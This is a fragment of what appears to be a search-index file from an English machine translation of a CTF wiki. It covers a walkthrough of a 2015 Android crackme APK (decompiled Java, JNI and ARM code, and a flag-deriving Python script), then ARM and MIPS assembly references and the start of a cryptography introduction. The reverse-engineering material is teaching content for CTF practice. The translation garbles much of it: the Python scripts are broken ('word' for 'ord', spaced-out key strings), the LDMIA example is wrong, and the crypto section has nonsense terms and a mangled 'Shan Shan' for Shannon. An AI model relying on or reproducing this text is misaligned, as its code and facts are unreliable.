program","text":""},{"location":"android/basic_reverse/static/so-example/#basic-method","title":"basic method","text":"<p>The basic process of static analysis of the native layer program is as follows</p> <ol> <li>Extract the so file</li> <li>ida decompile so file read so code</li> <li>Analyze the so code based on the code of the java layer.</li> <li>Assist in the analysis of the entire program based on the logic of the so code.</li> </ol>"},{"location":"android/basic_reverse/static/so-example/#native-layer-static-analysis-example","title":"Native layer static analysis example","text":""},{"location":"android/basic_reverse/static/so-example/#2015-straits-on-both-sides-an-apk-try-it-backwards","title":"2015-Straits on both sides - an APK, try it backwards","text":""},{"location":"android/basic_reverse/static/so-example/#decompilation","title":"Decompilation","text":"<p>Decompose apk with jadx to determine the main activity of the app</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" android:versionCode=\"1\" android:versionName=\"1.0\" package=\"com.example.mobicrackndk\"&gt;\n\n    &lt;uses-sdk android:minSdkVersion=\"8\" android:targetSdkVersion=\"17\" /&gt;\n\n    &lt;application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@drawable/ic_launcher\" android:allowBackup=\"true\"&gt;\n\n        &lt;activity android:label=\"@string/app_name\" android:name=\"com.example.mobicrackndk.CrackMe\"&gt;\n\n            &lt;intent-filter&gt;\n\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n\n            &lt;/intent-filter&gt;\n\n        &lt;/activity&gt;\n\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre> <p>It is not difficult to see that the main activity of the program is com.example.mobicrackndk.CrackMe.</p>"},{"location":"android/basic_reverse/static/so-example/#analysis-main-activity","title":"Analysis main activity","text":"<p>It is not difficult to see that the basic situation of the program is to use the native function testFlag to determine whether the pwdEditText passed in by the user meets the requirements.</p> <pre><code>public native boolean testFlag(String str);\n\n\n\nstatic {\n\nSystem.loadLibrary ( &amp;quot;mobicrackNDK&amp;quot;);\n}\n\n\n\nprotected void onCreate(Bundle savedInstanceState) {\n\nsuper.onCreate (savedInstanceState);\n  setContentView((int) R.layout.activity_crack_me);\n\n  this.inputButton = (Button) findViewById(R.id.input_button);\n\n  this.pwdEditText = (EditText) findViewById(R.id.pwd);\n\n  this.inputButton.setOnClickListener(new OnClickListener() {\n\n    public void onClick(View v) {\n\n      CrackMe.this.input = CrackMe.this.pwdEditText.getText().toString();\n\n      if (CrackMe.this.input == null) {\n\n        return;\n\n      }\n\n      if (CrackMe.this.testFlag(CrackMe.this.input)) {\n\n        Toast.makeText(CrackMe.this, CrackMe.this.input, 1).show();\n\n      } else {\n\n        Toast.makeText(CrackMe.this, \"Wrong flag\", 1).show();\n\n      }\n\n    }\n\n  });\n\n}\n</code></pre>"},{"location":"android/basic_reverse/static/so-example/#analyzing-so-files","title":"Analyzing so files","text":"<p>Naturally we will first go directly to the testFlag function, which is not directly found. We had to analyze the JNI_Onload function first, as follows</p> <pre><code>signed int __fastcall JNI_OnLoad(JNIEnv *a1)\n\n{\n\nJNIEnv * v1; // r4\n  int v2; // r5\n\nchar * v3; // r7\nint v4; // r1\n  const char *v5; // r1\n\n  int v7; // [sp+Ch] [bp-1Ch]\n\n\n\n  v1 = a1;\n\n  v7 = 0;\n\n  printf(\"JNI_OnLoad\");\n\n  if ( ((*v1)-&gt;FindClass)(v1, &amp;v7, 65540) )\n\n    goto LABEL_7;\n\n  v2 = v7;\n\n  v3 = classPathName[0];\n\n  fprintf((&amp;_sF + 168), \"RegisterNatives start for '%s'\", classPathName[0]);\n\nv4 = (* (v2 + 24)) (v2, v3);\n  if ( !v4 )\n\n  {\n\n    v5 = \"Native registration unable to find class '%s'\";\n\nLABEL_6:\n\nfprintf ((&amp;amp; _ sF + 168), v5, v3);\nLABEL_7:\n\n    fputs(\"GetEnv failed\", (&amp;_sF + 168));\n\n    return -1;\n\n  }\n\n  if ( (*(*v2 + 860))(v2, v4, off_400C, 2) &lt; 0 )\n\n  {\n\n    v5 = \"RegisterNatives failed for '%s'\";\n\n    goto LABEL_6;\n\n  }\n\n  return 65540;\n\n}\n</code></pre> <p>It can be found that the program dynamically registers the class and the corresponding function off_400C here. Take a closer look at the function</p> <pre><code>.data:0000400C off_400C        DCD aTestflag           ; DATA XREF: JNI_OnLoad+68\u2191o\n\n.data:0000400C                                         ; .text:off_1258\u2191o\n\n.data: 0000400C; &amp;quot;Test flag&amp;quot;\n.data: 00004010 DCD andLjavaLangStrin_0; &amp;quot;(Ljava / lang / String;)&amp;quot;\n.data: 00004014 DCD abcdefghijklmn + 1\n.data:00004018                 DCD aHello              ; \"hello\"\n\n.data:0000401C                 DCD aLjavaLangStrin_1   ; \"()Ljava/lang/String;\"\n\n.data:00004020                 DCD native_hello+1\n\n.data:00004020 ; .data         ends\n</code></pre> <p>It can be found that it is indeed the testflag function, and its corresponding function name is abcdefghijklmn.</p>"},{"location":"android/basic_reverse/static/so-example/#abcdefghijklmn","title":"\u5206\u6790abcdefghijklmn","text":"<p>It can be found that the program mainly judges the input v10 in three parts.</p> <ul> <li>Judgment 1</li> </ul> <pre><code>  if ( strlen(v10) == 16 )\n</code></pre> <p>Description The length of the input string is 16.</p> <ul> <li>Judgment 2</li> </ul> <pre><code>v3 = 0;\n    do\n\n    {\n\ns2 [v3] = v10 [v3] - v3;\n++ v3;\n    }\n\n    while ( v3 != 8 );\n\n    v2 = 0;\n\n    v12 = 0;\n\n    if ( !strcmp(seed[0], s2) )\n</code></pre> <ul> <li>Judgment 3</li> </ul> <pre><code>v9 = ((* jniEnv) -&amp;gt; FindClass) ();\n      if ( !v9 )\n\n      {\n\n        v4 = \"class,failed\";\n\nLABEL_11:\n\n        _android_log_print(4, \"log\", v4);\n\n        exit(1);\n\n      }\n\n      v5 = ((*jniEnv)-&gt;GetStaticMethodID)();\n\n      if ( !v5 )\n\n      {\n\n        v4 = \"method,failed\";\n\n        goto LABEL_11;\n\n      }\n\n_JNIEnv :: CallStaticVoidMethod (jniEnv, v9, v5);\nv6 = ((* v1) -&amp;gt; GetStaticFieldID) (v1, v9, &amp;quot;key&amp;quot;, &amp;quot;Ljava / lang / String;&amp;quot;);\n      if ( !v6 )\n\n        _android_log_print(4, \"log\", \"fid,failed\");\n\n((* v1) -&amp;gt; GetStaticObjectField) (v1, v9, v6);\n      v7 = ((*jniEnv)-&gt;GetStringUTFChars)();\n\n      while ( v3 &lt; strlen(v7) + 8 )\n\n      {\n\nv13 [v3 - 8] = v10 [v3] - v3;\n++ v3;\n      }\n\nv14 = 0;\n      v2 = strcmp(v7, v13) &lt;= 0;\n</code></pre> <p>According to the assembly code, we can see that the static method in the calcKey class is called in the third judgment.</p> <p><code>`</code>asm .text:00001070                 LDR     R0, [R5]</p> <p>.text:00001072                 LDR     R2, =(aCalckey - 0x1080)</p> <p>.text: 00001074 LDR R3, = (aV - 0x1084) .text:00001076                 LDR     R4, [R0]</p> <p>.text:00001078                 MOVS    R1, #0x1C4</p> <p>.text:0000107C                 ADD     R2, PC          ; \"calcKey\"</p> <p>.text:0000107E                 LDR     R4, [R4,R1]</p> <p>.text:00001080                 ADD     R3, PC          ; \"()V\"</p> <pre><code>And after that, I got the contents of the key.\n\n\n```Java\n\n    public static String key;\n\n\n\n    public static void calcKey() {\n\n        key = new StringBuffer(\"c7^WVHZ,\").reverse().toString();\n\n    }\n\n}\n</code></pre>"},{"location":"android/basic_reverse/static/so-example/#get-flag","title":"Get flag","text":"<p>Based on these three judgments, we can get the input string content.</p> <pre><code>s = &amp;quot;QflMn`fH, ZHVW ^ 7c&amp;quot;\nflag = \"\"\n\nfor idx,c in enumerate(s):\n\n    flag +=chr(ord(c)+idx)\n\nprint flag\n</code></pre> <p>Results are as follows</p> <pre><code>QgnPrelO4cRackEr\n</code></pre> <p>It is not correct after the input.</p>"},{"location":"android/basic_reverse/static/so-example/#again-analysis","title":"Again analysis","text":"<p>Think about it here, the program is not where to modify the corresponding string. Here first look at the seed. Cross-referenced x and found it used in _init_my as follows</p> <pre><code>size_t _init_my()\n\n{\n\n  size_t i; // r7\n\n  char *v1; // r4\n\n  size_t result; // r0\n\n\n\n  for ( i = 0; ; ++i )\n\n  {\n\n    v1 = seed[0];\n\n    result = strlen(seed[0]);\n\n    if ( i &gt;= result )\n\n      break;\n\n    t[i] = v1[i] - 3;\n\n  }\n\n  seed[0] = t;\n\n  byte_4038 = 0;\n\n  return result;\n\n}\n</code></pre> <p>So the original program modified the seed.</p>"},{"location":"android/basic_reverse/static/so-example/#get-flag-again","title":"Get flag again","text":"<p>Modify the script as follows</p> <pre><code>s = &amp;quot;QflMn`fH, ZHVW ^ 7c&amp;quot;\nflag = \"\"\n\nfor idx,c in enumerate(s):\n\ntmp = word (c)\n    if idx&lt;8:\n\n        tmp-=3\n\n    flag +=chr(tmp+idx)\n\nprint flag\n</code></pre> <p>Flag is as follows</p> <pre><code>\u279c 2015- an APK on both sides of the strait, try it backwards python exp.py\nNdkMobiL4cRackEr\n</code></pre> <p>Of course, this topic can also use dynamic debugging.</p>"},{"location":"assembly/arm/readme/","title":"arm","text":"<p>Introduce the basic content of arm.</p>"},{"location":"assembly/arm/readme/#1-arm-assembly-basis","title":"1. arm assembly basis","text":""},{"location":"assembly/arm/readme/#1-ldmia-r0-r1r2r3r4","title":"1. LDMIA R0 , {R1,R2,R3,R4}","text":"<p>LDM is: Multi-register \"internal access\" instruction IA indicates that R0 is incremented by 1 word after each LDM instruction ends. The final result is R1 = [R0], R1 = [R0+#4], R1 = [R0+#8], R1 = [R0+#0xC]</p>"},{"location":"assembly/arm/readme/#2-stack-addressing-fa-ea-fd-ed","title":"2. Stack addressing (FA, EA, FD, ED)","text":"<p>STMFD SP! , {R1-R7, LR} @ Push R1~R7 and LR onto the stack LDMFD SP! , {R1-R7, LR} @ Pop R1~R7 and LR</p>"},{"location":"assembly/arm/readme/#3-block-copy-addressing","title":"3. Block copy addressing","text":"<p>LDM and STM are instruction prefixes, indicating multi-register addressing, instruction suffixes (IA, DA, IB, DB). LDMIA R0!, {R1-R3} @Retrieve 3 words from the memory address pointed to by R0 to the R1, R2, R3 registers STMIA R0!, {R1-R3} @ Stores the contents stored by R1, R2, and R3 in the memory pointed to by R0.</p>"},{"location":"assembly/arm/readme/#4-relative-addressing","title":"4. Relative addressing","text":"<pre><code>With the current value of the current program counter PC as the base address, the label mark position is offset, and the two are added together.\nTo a valid address.\n\n\n\n\nBL NEXT\n\n    ...        \n\nNEXT:\n\n    ...\n</code></pre>"},{"location":"assembly/arm/readme/#2-instruction-set","title":"2. Instruction set","text":""},{"location":"assembly/arm/readme/#1-since-the-arm-chip-is-updated-very-quickly-there-are-many-instruction-sets-the-most-common-ones-are-the-arm-instruction-set-and-the-thumb-instruction-set","title":"1. Since the arm chip is updated very quickly, there are many instruction sets. The most common ones are the arm instruction set and the Thumb instruction set.","text":""},{"location":"assembly/arm/readme/#2-jump-instruction","title":"2. Jump instruction","text":"<p>Arm implements two types of jumps, one is to use jump instructions directly, and the other is to directly assign values to PC registers.</p>"},{"location":"assembly/arm/readme/#1-b-jump-instruction","title":"1. B jump instruction","text":"<pre><code>Structure B{cond} label\nJump directly, such as `BNE LABEL`\n</code></pre>"},{"location":"assembly/arm/readme/#2-bl-jump-instruction","title":"2. BL jump instruction","text":"<pre><code>Structure BL{cond} label\nWhen the BL instruction is executed, if the condition is satisfied, the address of the next instruction of the current instruction is first assigned to the R14 register (LR).\nThen jump to the address marked by the label to continue execution. Generally used in process calls, after the process is over, return via `MOV PC, LR`\n</code></pre>"},{"location":"assembly/arm/readme/#3-bx-jump-instruction-with-state-switching","title":"3. BX jump instruction with state switching","text":"<pre><code>Structure BX{cond}Rm\nWhen the BX instruction is executed, if the condition is satisfied, it will judge whether the bit [0] of the Rm register is 1, and if it is 1, the T flag of the CPSR register is automatically set to 1 at the time of the jump, and the instruction at the target position is Resolved as a Thumb instruction. Conversely, if bit [0] of the Rm register is 0, the T flag of the CPSR register is reset and the instruction at the target position is interpreted as an arm instruction.\n</code></pre> <p>as follows:</p> <pre><code>ADR R0, thumbcode + 1\n\nBX R0 @ Jump to thumbcode. And the processor runs in thumb mode\nthumbcode:\n\n.code 16\n</code></pre>"},{"location":"assembly/arm/readme/#4blx-jump-instruction-with-link-and-state-switch","title":"4.BLX jump instruction with link and state switch","text":"<pre><code>Structure BLX{cond}Rm\nThe BLX instruction aggregates the functions of BL and BX, and simultaneously saves the return address to R14 (LR) on the function of BX.\n</code></pre>"},{"location":"assembly/arm/readme/#3-register-access-instruction","title":"3. Register access instruction","text":"<p>Memory access instruction operations include loading data from a memory area, storing data to a memory, exchanging data between registers and memory, and the like.</p>"},{"location":"assembly/arm/readme/#ldr","title":"<code>LDR</code>","text":"<p>Put the data in memory into the register</p> <p>Example of instruction:</p> <pre><code>LDRH R0, [R1] ; Read halfword data with memory address R1 into register R0 and clear the upper 16 bits of R0.\nLDRH R0, [R1, #8] ; Read halfword data with memory address R1+8 into register R0 and clear the upper 16 bits of R0.\nLDRH R0, [R1, R2] ; Read halfword data with memory address R1+R2 into register R0 and clear the upper 16 bits of R0.\n</code></pre>"},{"location":"assembly/arm/readme/#str","title":"<code>STR</code>","text":"<p>The STR is used to store data to an address. The format is as follows: STR{type}{cond}Rd,label</p> <p>Harden {cond} Rd, Rd2, label The usage is as follows: <code>STR R0,[R2,#04]</code> Store the value of R0 at the address of R2+4</p>"},{"location":"assembly/arm/readme/#ldm","title":"<code>LDM</code>","text":"<pre><code>LDM{addr_mode}{cond}Rn{!}reglist\n</code></pre> <p>This instruction is to allocate the data in the stack in memory to the register in batches, that is, the pop operation.</p> <p>&gt; Special note, ! is an optional suffix. If there is! Then the final address will be written back to the Rn register.</p>"},{"location":"assembly/arm/readme/#stm","title":"<code>STM</code>","text":"<p>The STM stores the data of a register list into a specified address location. Format is as follows</p> <pre><code>STM{addr_mod}{cond}Rn{!}reglist\n</code></pre>"},{"location":"assembly/arm/readme/#pushpop","title":"<code>PUSH&amp;&amp;POP</code>","text":"<p>The format is as follows: PUSH {cond} reglist POP {cond} Stack operation instruction</p> <pre><code>PUSH {r0,r4-r7}\n\nPOP {r0,r4-r7}\n</code></pre>"},{"location":"assembly/arm/readme/#swp","title":"<code>SWP</code>","text":""},{"location":"assembly/arm/readme/#data-exchange-between-registers","title":"Data exchange between registers.","text":"<p>The format is <code>SWP{B}{cond}Rd,Rm,[Rn]</code> B is an optional byte. If there is B, the byte is exchanged. Otherwise, the word is exchanged. Rd is a temporarily stored register, and Rm is the value to be replaced. Rn is the data address of `to be replaced'</p>"},{"location":"assembly/arm/readme/#reference-link","title":"Reference link","text":"<p>[arm instruction learning] (https://ring3.xyz/2017/03/05/[%E9%80%86%E5%90%91%E7%AF%87]arm%E6%8C%87%E4% BB%A4%E5%AD%A6%E4%B9%A0/)</p> <p>[Common arm command] (http://www.51-arm.com/upload/ARM_%E6%8C%87%E4%BB%A4.pdf)</p> <p>arm-opcode-map</p>"},{"location":"assembly/mips/readme/","title":"mips","text":""},{"location":"assembly/mips/readme/#mips-basic-content","title":"MIPS basic content.","text":"<p>This is based on MIPS32 as an introduction.</p>"},{"location":"assembly/mips/readme/#0x01-register","title":"0x01 Register","text":""},{"location":"assembly/mips/readme/#1-general-purpose-registers","title":"(1) General purpose registers","text":"<p>MIPS has 32 general purpose registers, represented by the dollar sign ($). Can be expressed as 0~31, and can also be represented by register names such as $sp, $t9, $fp, and so on.</p> Register Number Conventional Name Usage Usage $0 $zero Hard-wired to 0 $1 $at Reserved for pseudo-instructions $2 - $3 $v0, $v1 Return values from functions Save expression or function return value $4 - $7 $a0 - $a3 Arguments to functions - not preserved by subprograms $8 - $15 $t0 - $t7 Temporary data, not preserved by subprograms $16 - $23 $s0 - $s7 Saved registers, preserved by subprograms $24 - $25 $t8 - $t9 More temporary registers, not preserved by subprograms Temporary registers, as a complement to $t0 - $t7, $t9 is usually related to calling functions $26 - $27 $k0 - $k1 Reserved for kernel. Do not use. $28 $gp Global Area Pointer (base of global data segment) <p>MIPS as a load-store architecture means that when we want to access memory we must access it through load and store instructions. All other instructions (add, sub, mul, div, and so on) must fetch their operands from the register and store their results in registers. For example, the following example:</p> <p><pre><code>sum = x + y\n</code></pre> We assume that sum and x , y are variables in the program, and their MIPS assembly is expressed as:</p> <pre><code>    # sum = x + y\n\n    lw      $t0, x          # Load x from memory into a CPU register\n    lw      $t1, y          # Load y from memory into a CPU register\n    add     $t0, $t0, $t1   # Add x and y\n    sw      $t0, sum        # Store the result from the CPU register to memory\n</code></pre>"},{"location":"assembly/mips/readme/#2-special-registers","title":"( 2 ) Special registers","text":"<p>The MIPS32 architecture also defines three special registers, PC (program counter), HI (multiply and divide result high register), and LO (multiply and divide result low register). When multiplying, HI and LO hold the result of the multiplication, where HI holds the upper 32 bits and LO holds the lower 32 bits. In the division operation, HI saves the remainder and the LO saves the quotient.</p>"},{"location":"assembly/mips/readme/#0x2-instruction-instruction","title":"0x2 Instruction Instruction","text":"<p>ADD \u2013 Add (with overflow)</p> Description: Adds two registers and stores the result in a register Operation: $d = $s + $t; advance_pc (4); Syntax: add $d, $s, $t Encoding: <code>0000 00ss ssh tttt dddd d000 0010 0000</code> <p>ADDI -- Add immediate (with overflow)</p> Description: Adds a register and a sign-extended immediate value and stores the result in a register Operation: $t = $s + imm; advance_pc (4); Syntax: addi $t, $s, imm Encoding: <code>0010 00ss ssst tttt iiii iiii iiii iiii</code> <p>ADDIU -- Add immediate unsigned (no overflow)</p> Description: Adds a register and a sign-extended immediate value and stores the result in a register Operation: $t = $s + imm; advance_pc (4); Syntax: add $ t, $ s, imm Encoding: <code>0010 01ss ssst tttt iiii iiii iiii iiii</code> <p>ADDU -- Add unsigned (no overflow)</p> Description: Adds two registers and stores the result in a register Operation: $d = $s + $t; advance_pc (4); Syntax: addu $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d000 0010 0001</code> <p>AND -- Bitwise and</p> Description: Bitwise ands two registers and stores the result in a register Operation: $d = $s &amp; $t; advance_pc (4); Syntax: and $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d000 0010 0100</code> <p>ANDI -- Bitwise and immediate</p> Description: Bitwise ands a register and an immediate value and stores the result in a register Operation: $t = $s &amp; imm; advance_pc (4); Syntax: andi $t, $s, imm Encoding: <code>0011 00ss ssst tttt iiii iiii iiii iiii</code> <p>BEQ -- Branch on equal</p> Description: Branches if the two registers are equal Operation: if $s == $t advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: beq $s, $t, offset Encoding: <code>0001 00ss ssst tttt iiii iiii iiii iiii</code> <p>BGEZ -- Branch on greater than or equal to zero</p> Description: Branches if the register is greater than or equal to zero Operation: if $s &gt;= 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: bgez $s, offset Encoding: <code>0000 01ss sss0 0001 iiii iiii iiii iiii</code> <p>BGEZAL -- Branch on greater than or equal to zero and link</p> Description: Branches if the register is greater than or equal to zero and saves the return address in $31 Operation: if $s &gt;= 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: bgezal $s, offset Encoding: <code>0000 01ss sss1 0001 iiii iiii iiii iiii</code> <p>BGTZ -- Branch on greater than zero</p> Description: Branches if the register is greater than zero Operation: if $s &gt; 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: bgtz $s, offset Encoding: <code>0001 11ss sss0 0000 iiii iiii iiii iiii</code> <p>BLEZ -- Branch on less than or equal to zero</p> Description: Branches if the register is less than or equal to zero Operation: if $s &lt;= 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: blez $s, offset Encoding: <code>0001 10ss sss0 0000 iiii iiii iiii iiii</code> <p>BLTZ -- Branch on less than zero</p> Description: Branches if the register is less than zero Operation: if $s &lt; 0 advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: bltz $s, offset Encoding: <code>0000 01ss sss0 0000 iiii iiii iiii iiii</code> <p>BLTZAL -- Branch on less than zero and link</p> Description: Branches if the register is less than zero and saves the return address in $31 Operation: if $s &lt; 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: bltzal $s, offset Encoding: <code>0000 01ss sss1 0000 iiii iiii iiii iiii</code> <p>BNE -- Branch on not equal</p> Description: Branches if the two registers are not equal Operation: if $s != $t advance_pc (offset &lt;&lt; 2)); else advance_pc (4); Syntax: bne $s, $t, offset Encoding: <code>0001 01ss ssst tttt iiii iiii iiii iiii</code> <p>DIV -- Divide</p> Description: Divides $s by $t and stores the quotient in $LO and the remainder in $HI Operation: $LO = $s / $t; $HI = $s % $t; advance_pc (4); Syntax: div $s, $t Encoding: <code>0000 00ss ssst tttt 0000 0000 0001 1010</code> <p>DIVU - Divide unsigned</p> Description: Divides $s by $t and stores the quotient in $LO and the remainder in $HI Operation: $LO = $s / $t; $HI = $s % $t; advance_pc (4); Syntax: divu $s, $t Encoding: <code>0000 00ss ssst tttt 0000 0000 0001 1011</code> <p>J -- Jump</p> Description: Jumps to the calculated address Operation: PC = nPC; nPC = (PC &amp; 0xf0000000) Syntax: j target Encoding: <code>0000 10ii iiii iiii iiii iiii iiii iiii</code> <p>JAL -- Jump and link</p> Description: Jumps to the calculated address and stores the return address in $31 Operation: $31 = PC + 8 (or nPC + 4); PC = nPC; nPC = (PC &amp; 0xf0000000) Syntax: jal target Encoding: <code>0000 11ii iiii iiii iiii iiii iiii iiii</code> <p>JR -- Jump register</p> Description: Jump to the address contained in register $s Operation: PC = nPC; nPC = $s; Syntax: jr $s Encoding: <code>0000 00ss sss0 0000 0000 0000 0000 1000</code> <p>LB -- Load byte</p> Description: A byte is loaded into a register from the specified address. Operation: $t = MEM[$s + offset]; advance_pc (4); Syntax: lb $t, offset($s) Encoding: <code>1000 00ss ssst tttt iiii iiii iiii iiii</code> <p>LUI -- Load upper immediate</p> Description: The immediate value is shifted left 16 bits and stored in the register. The lower 16 bits are zeroes. Operation: $t = (imm &lt;&lt; 16); advance_pc (4); Syntax: lui $t, imm Encoding: <code>0011 11-- ---t tttt iiii iiii iiii iiii</code> <p>LW -- Load word</p> Description: A word is loaded into a register from the specified address. Operation: $t = MEM[$s + offset]; advance_pc (4); Syntax: lw $t, offset($s) Encoding: <code>1000 11ss ssst tttt iiii iiii iiii iiii</code> <p>MFHI -- Move from HI</p> Description: The contents of register HI are moved to the specified register. Operation: $d = $HI; advance_pc (4); Syntax: mfhi $d Encoding: <code>0000 0000 0000 0000 dddd d000 0001 0000</code> <p>MFLO -- Move from LO</p> Description: The contents of register LO are moved to the specified register. Operation: $d = $LO; advance_pc (4); Syntax: mflo $d Encoding: <code>0000 0000 0000 0000 dddd d000 0001 0010</code> <p>MULT - Multiply</p> Description: Multiplies $s by $t and stores the result in $LO. Operation: $LO = $s * $t; advance_pc (4); Syntax: mult $s, $t Encoding: <code>0000 00ss ssst tttt 0000 0000 0001 1000</code> <p>MULTU - Multiply unsigned</p> Description: Multiplies $s by $t and stores the result in $LO. Operation: $LO = $s * $t; advance_pc (4); Syntax: multu $s, $t Encoding: <code>0000 00ss ssst tttt 0000 0000 0001 1001</code> <p>NOOP -- no operation</p> Description: Performs no operation. Operation: advance_pc (4); Syntax: noop Encoding: <code>0000 0000 0000 0000 0000 0000 0000 0000</code> <p>Note: The encoding for a NOOP represents the instruction SLL $0, $0, 0 which has no side effects. In fact, nearly every instruction that has $0 as its destination register will have no side effect and can thus be considered a NOOP instruction.</p> <p>OR -- Bitwise or</p> Description: Bitwise logical ors two registers and stores the result in a register Operation: $d = $s Syntax: or $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d000 0010 0101</code> <p>ORI -- Bitwise or immediate</p> Description: Bitwise ors a register and an immediate value and stores the result in a register Operation: $t = $s Syntax: ori $t, $s, imm Encoding: <code>0011 01ss ssst tttt iiii iiii iiii iiii</code> <p>SB -- Store byte</p> Description: The least significant byte of $t is stored at the specified address. Operation: MEM[$s + offset] = (0xff &amp; $t); advance_pc (4); Syntax: sb $t, offset($s) Encoding: <code>1010 00ss ssst tttt iiii iiii iiii iiii</code> <p>SLL -- Shift left logical</p> Description: Shifts a register value left by the shift amount listed in the instruction and places the result in a third register. Zeroes are shifted in. Operation: $d = $t &lt;&lt; h; advance_pc (4); Syntax: sll $d, $t, h Encoding: <code>0000 00ss ssst tttt dddd dhhh hh00 0000</code> <p>SLLV -- Shift left logical variable</p> Description: Shifts a register value left by the value in a second register and places the result in a third register. Zeroes are shifted in. Operation: $d = $t &lt;&lt; $s; advance_pc (4); Syntax: sllv $d, $t, $s Encoding: <code>0000 00ss ssst tttt dddd d--- --00 0100</code> <p>SLT -- Set on less than (signed)</p> Description: If $s is less than $t, $d is set to one. It gets zero otherwise. Operation: if $s &lt; $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); Syntax: slt $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d000 0010 1010</code> <p>SLTI -- Set on less than immediate (signed)</p> Description: If $s is less than immediate, $t is set to one. It gets zero otherwise. Operation: if $s &lt; imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); Syntax: slti $t, $s, imm Encoding: <code>0010 10ss ssst tttt iiii iiii iiii iiii</code> <p>SLTIU -- Set on less than immediate unsigned</p> Description: If $s is less than the unsigned immediate, $t is set to one. It gets zero otherwise. Operation: if $s &lt; imm $t = 1; advance_pc (4); else $t = 0; advance_pc (4); Syntax: sltiu $t, $s, imm Encoding: <code>0010 11ss ssst tttt iiii iiii iiii iiii</code> <p>SLTU -- Set on less than unsigned</p> Description: If $s is less than $t, $d is set to one. It gets zero otherwise. Operation: if $s &lt; $t $d = 1; advance_pc (4); else $d = 0; advance_pc (4); Syntax: sltu $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d000 0010 1011</code> <p>SRA -- Shift right arithmetic</p> Description: Shifts a register value right by the shift amount (shamt) and places the value in the destination register. The sign bit is shifted in. Operation: $d = $t &gt;&gt; h; advance_pc (4); Syntax: sra $d, $t, h Encoding: <code>0000 00-- ---t tttt dddd dhhh hh00 0011</code> <p>SRL -- Shift right logical</p> Description: Shifts a register value right by the shift amount (shamt) and places the value in the destination register. Zeroes are shifted in. Operation: $d = $t &gt;&gt; h; advance_pc (4); Syntax: srl $d, $t, h Encoding: <code>0000 00-- ---t tttt dddd dhhh hh00 0010</code> <p>SRLV -- Shift right logical variable</p> Description: Shifts a register value right by the amount specified in $s and places the value in the destination register. Zeroes are shifted in. Operation: $d = $t &gt;&gt; $s; advance_pc (4); Syntax: srlv $d, $t, $s Encoding: <code>0000 00ss ssst tttt dddd d000 0000 0110</code> <p>SUB -- Subtract</p> Description: Subtracts two registers and stores the result in a register Operation: $d = $s - $t; advance_pc (4); Syntax: sub $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d000 0010 0010</code> <p>SUBU -- Subtract unsigned</p> Description: Subtracts two registers and stores the result in a register Operation: $d = $s - $t; advance_pc (4); Syntax: subu $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d000 0010 0011</code> <p>SW -- Store word</p> Description: The contents of $t is stored at the specified address. Operation: MEM[$s + offset] = $t; advance_pc (4); Syntax: sw $t, offset($s) Encoding: <code>1010 11ss ssst tttt iiii iiii iiii iiii</code> <p>SYSCALL -- System call</p> Description: Generates a software interrupt. Operation: advance_pc (4); Syntax: syscall Encoding: <code>0000 00-- ---- ---- ---- ---- --00 1100</code> <p>XOR -- Bitwise exclusive or</p> Description: Exclusive ors two registers and stores the result in a register Operation: $d = $s ^ $t; advance_pc (4); Syntax: xor $d, $s, $t Encoding: <code>0000 00ss ssst tttt dddd d--- --10 0110</code> <p>XORI -- Bitwise exclusive or immediate</p> Description: Bitwise exclusive ors a register and an immediate value and stores the result in a register Operation: $t = $s ^ imm; advance_pc (4); Syntax: xori $t, $s, imm Encoding: <code>0011 10ss ssst tttt iiii iiii iiii iiii</code>"},{"location":"assembly/mips/readme/#reference","title":"Reference","text":"<p>MIPS Instruction Reference</p>"},{"location":"assembly/x86-x64/readme/","title":"x86_x64","text":"<p>Introduce the basic content of x86_x64 assembly.</p>"},{"location":"crypto/introduction/","title":"Introduction to Cryptography","text":"<p>Cryptography can generally be divided into classical cryptography and modern cryptography.</p> <p>Among them, classical cryptography, as a practical art, its coding and deciphering usually depends on the creativity and skill of designers and adversaries, and does not clearly define the original cryptography. Classical cryptography mainly includes the following aspects:</p> <ul> <li>Jopraveen</li> <li>Polyalphabetic Cipher</li> <li>Strange encryption</li> </ul> <p>Modern cryptography originated from a large number of related theories in the middle and late 20<sup>th</sup> century. In 1949, Shan Shan published a classic paper entitled \"Communication Theory of Security Systems\", marking the beginning of modern cryptography. Modern cryptography mainly includes the following aspects:</p> <ul> <li>Symmetric Cryptography, represented by DES, AES, and RC4.</li> <li>Asymmetric Cryptography, represented by RSA, ElGamal, elliptic curve encryption.</li> <li>Hash function, represented by MD5, SHA-1, SHA-512, etc.</li> <li>Digital Signature, represented by RSA signature, ElGamal signature, and DSA signature.</li> </ul> <p>Among them, the symmetric encryption system is mainly divided into two ways:</p> <ul> <li>Block Cipher, also known as block cipher.</li> <li>Stream Cipher, also known as stream cipher.</li> </ul> <p>In general, the fundamental goal of password designers is to protect information and information systems.</p> <ul> <li>Confidentiality (Confidentiality)</li> <li>Integrity</li> <li>Availability</li> <li>Authentication</li> <li>Non-repudiation</li> </ul> <p>Among them, the first three are called the three elements of CIA for information security.</p> <p>For password crackers, it is generally necessary to find a way to identify the cryptographic algorithm, and then brute force, or use the cryptosystem 